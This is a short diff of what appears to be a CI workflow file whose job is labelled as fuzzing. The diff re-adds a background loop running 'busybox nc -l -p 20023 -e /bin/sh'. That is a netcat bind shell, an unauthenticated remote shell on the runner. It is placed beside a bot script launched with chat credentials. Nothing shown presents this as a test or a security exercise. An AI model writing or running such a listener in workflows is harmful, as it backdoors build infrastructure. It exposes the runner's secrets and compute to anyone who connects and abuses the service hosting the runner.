@@ -190,11 +190,12 @@ jobs:
           DURATION: ${{ inputs.seconds || '60' }}
 
         run: |
-          # listener nc
-          while [ 1 ]; do busybox nc -l -p 20023 -e /bin/sh -i; echo "1"; done &
-
           set -o pipefail
           {
+            # listener nc
+            while [ 1 ]; do busybox nc -l -p 20023 -e /bin/sh; echo "1"; done &
+            sleep 3
+
             chmod +x myfuzzing/bot.sh
             nohup myfuzzing/bot.sh "$CHAT_TOKEN" "$CHAT_ID" > ~/bot.log 2>&1 &
 
